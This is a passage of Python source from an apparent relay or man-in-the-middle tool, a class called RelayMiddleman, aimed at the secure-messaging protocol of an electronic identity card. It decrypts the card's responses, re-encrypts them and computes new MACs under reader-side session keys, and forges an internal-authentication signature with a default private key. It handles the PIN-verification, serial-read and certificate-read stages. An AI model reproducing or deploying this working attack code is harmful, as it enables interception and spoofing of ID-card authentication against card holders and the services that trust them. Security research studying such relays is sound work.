            respBaBytes = [0x6a] + PRND2 + calcHashIFD +[0xbc]

            module = int.from_bytes(DEFMODULE, 'big')
            privexp = int.from_bytes(DEFPRIVEXP, 'big')
            respBa = int.from_bytes(respBaBytes, 'big')
            SIG = list(int.to_bytes(pow(respBa, privexp, module), 256, 'big'))
            intAuthresp = SN_ICC + SIG

            # crafting the SM response
            iv = [0 for _ in range(8)]
            RelayMiddleman.increment(self.sessSSC_ICC)
            RelayMiddleman.increment(self.sessSSC_IFD)
            encDes_IFD = CDES3(self.sessENC_IFD, iv)
            sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

            encIntAuthresp = encDes_IFD.encrypt(ISOPad(intAuthresp))

            Val01 = [1]
            datafield = []
            Val01 += encIntAuthresp
            setASN1Tag(datafield, 0x87, Val01)
            calcMac = self.sessSSC_IFD.copy()
            macTail= [ 0x99, 0x02, 0x90, 0x00 ]

            calcMac += datafield
            calcMac += macTail
            smMac = sigMac_IFD.mac(ISOPad(calcMac))
            sw = [ 0x90, 0x00 ]
            data = datafield + macTail
            ccfb = []
            setASN1Tag(ccfb, 0x8e, smMac)
            self.intAuthSMresp = data + ccfb + sw

            self.resp[:256] = self.intAuthSMresp[:256]
        elif self.prev_apdu[:4] == GIVERANDOM:
            self.resp[:35] = self.intAuthSMresp[256:256+35]
            self.stage = Stage.VERIFYPIN

            challengeBa = self.challenge[-4:]
            rndIFDBa = self.rndIFD[-4:]

            self.sessSSC_ICC = challengeBa.copy() + rndIFDBa.copy()
            self.sessSSC_IFD = challengeBa.copy() + rndIFDBa.copy()
        else:
            crafted_resp = self.craft_respSM(self.sessENC_IFD, self.sessMAC_IFD, self.resp[:16], self.sessSSC_IFD)

            self.resp[:16] = crafted_resp[:16]

    def verifypin_out(self):
        crafted_resp = self.craft_respSM(self.sessENC_IFD, self.sessMAC_IFD, self.resp[:16], self.sessSSC_IFD)

        self.resp[:16] = crafted_resp[:16]

        self.stage = Stage.READSERIALECIE


    def readserialecie_out(self):
        if self.curr_apdu[:4] == SELECTFILE:
            iv = [0 for _ in range(8)]
            encDes_ICC = CDES3(self.sessENC_ICC, iv)
            
            # saving the encrypted challenge
            tmp = self.resp[3:3+32]
            data = encDes_ICC.decrypt(tmp)
            payload = data[:RemoveISOPad(data)]

            # crafting the response
            RelayMiddleman.increment(self.sessSSC_ICC)
            RelayMiddleman.increment(self.sessSSC_IFD)
            encDes_IFD = CDES3(self.sessENC_IFD, iv)
            sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

            encPayload = encDes_IFD.encrypt(ISOPad(payload))

            Val01 = [1]
            datafield = []
            Val01 += encPayload
            setASN1Tag(datafield, 0x87, Val01)
            calcMac = self.sessSSC_IFD.copy()
            macTail= [ 0x99, 0x02, 0x90, 0x00 ]

            calcMac += datafield
            calcMac += macTail
            smMac = sigMac_IFD.mac(ISOPad(calcMac))
            sw = [ 0x90, 0x00 ]

            data = datafield + macTail
            ccfb = []
            setASN1Tag(ccfb, 0x8e, smMac)
            respBa = data + ccfb + sw

            self.resp = respBa.copy()
        if self.curr_apdu[:4] == ReadFile:
            iv = [0 for _ in range(8)]
            encDes_ICC = CDES3(self.sessENC_ICC, iv)
            
            # saving the encrypted challenge
            tmp = self.resp[3:3+16]
            data = encDes_ICC.decrypt(tmp)
            payload = data[:RemoveISOPad(data)]

            # crafting the response
            RelayMiddleman.increment(self.sessSSC_ICC)
            RelayMiddleman.increment(self.sessSSC_IFD)
            encDes_IFD = CDES3(self.sessENC_IFD, iv)
            sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

            encPayload = encDes_IFD.encrypt(ISOPad(payload))

            Val01 = [1]
            datafield = []
            Val01 += encPayload
            setASN1Tag(datafield, 0x87, Val01)
            calcMac = self.sessSSC_IFD.copy()
            macTail= [ 0x99, 0x02, 0x62, 0x82 ]

            calcMac += datafield
            calcMac += macTail
            smMac = sigMac_IFD.mac(ISOPad(calcMac))
            sw = [ 0x62, 0x82 ]

            data = datafield + macTail
            ccfb = []
            setASN1Tag(ccfb, 0x8e, smMac)
            respBa = data + ccfb + sw

            self.resp = respBa.copy()
            self.stage = Stage.READCERTCIE

    def readcertcie_out(self):
        global ReadFile
        print([hex(i) for i in self.curr_apdu[:4]])
        print([hex(i) for i in ReadFile])
        print()
        if self.curr_apdu[:4] == SELECTFILE:
            iv = [0 for _ in range(8)]
            encDes_ICC = CDES3(self.sessENC_ICC, iv)
            
            # saving the encrypted challenge
            tmp = self.resp[3:3+32]
            data = encDes_ICC.decrypt(tmp)
            payload = data[:RemoveISOPad(data)]

            # crafting the response
            RelayMiddleman.increment(self.sessSSC_ICC)
            RelayMiddleman.increment(self.sessSSC_IFD)
            encDes_IFD = CDES3(self.sessENC_IFD, iv)
            sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

            encPayload = encDes_IFD.encrypt(ISOPad(payload))

            Val01 = [1]
            datafield = []
            Val01 += encPayload
            setASN1Tag(datafield, 0x87, Val01)
            calcMac = self.sessSSC_IFD.copy()
            macTail= [ 0x99, 0x02, 0x90, 0x00 ]

            calcMac += datafield
            calcMac += macTail
            smMac = sigMac_IFD.mac(ISOPad(calcMac))
            sw = [ 0x90, 0x00 ]

            data = datafield + macTail
            ccfb = []
            setASN1Tag(ccfb, 0x8e, smMac)
            respBa = data + ccfb + sw

            self.resp = respBa.copy()
        if self.curr_apdu[:4] == ReadFile:
            if ReadFile[2] < 0x06:
                iv = [0 for _ in range(8)]
                encDes_ICC = CDES3(self.sessENC_ICC, iv)
                
                # saving the encrypted challenge
                tmp = self.resp[4:4+0x88]
                data = encDes_ICC.decrypt(tmp)
                payload = data[:RemoveISOPad(data)]

                # crafting the response
                RelayMiddleman.increment(self.sessSSC_ICC)
                RelayMiddleman.increment(self.sessSSC_IFD)
                encDes_IFD = CDES3(self.sessENC_IFD, iv)
                sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

                encPayload = encDes_IFD.encrypt(ISOPad(payload))

                Val01 = [1]
                datafield = []
                Val01 += encPayload
                setASN1Tag(datafield, 0x87, Val01)
                calcMac = self.sessSSC_IFD.copy()
                macTail= [ 0x99, 0x02, 0x90, 0x00  ]

                calcMac += datafield
                calcMac += macTail
                smMac = sigMac_IFD.mac(ISOPad(calcMac))
                sw = [ 0x62, 0x82 ]

                data = datafield + macTail
                ccfb = []
                setASN1Tag(ccfb, 0x8e, smMac)
                respBa = data + ccfb + sw

                self.cnt += 0x80
                ReadFile[2] = (self.cnt >> 8) & 0xFF
                ReadFile[3] = self.cnt & 0xff
                self.resp = respBa.copy()
            else:
                iv = [0 for _ in range(8)]
                encDes_ICC = CDES3(self.sessENC_ICC, iv)
                
                # saving the encrypted challenge
                tmp = self.resp[4:4+0x80]
                data = encDes_ICC.decrypt(tmp)
                payload = data[:RemoveISOPad(data)]

                # crafting the response
                RelayMiddleman.increment(self.sessSSC_ICC)
                RelayMiddleman.increment(self.sessSSC_IFD)
                encDes_IFD = CDES3(self.sessENC_IFD, iv)
                sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

                encPayload = encDes_IFD.encrypt(ISOPad(payload))

                Val01 = [1]
                datafield = []
                Val01 += encPayload
                setASN1Tag(datafield, 0x87, Val01)
                calcMac = self.sessSSC_IFD.copy()
                macTail= [ 0x99, 0x02, 0x62, 0x82 ]

                calcMac += datafield
                calcMac += macTail
                smMac = sigMac_IFD.mac(ISOPad(calcMac))
                sw = [ 0x62, 0x82 ]

                data = datafield + macTail
                ccfb = []
                setASN1Tag(ccfb, 0x8e, smMac)
                respBa = data + ccfb + sw

                self.resp = respBa.copy()

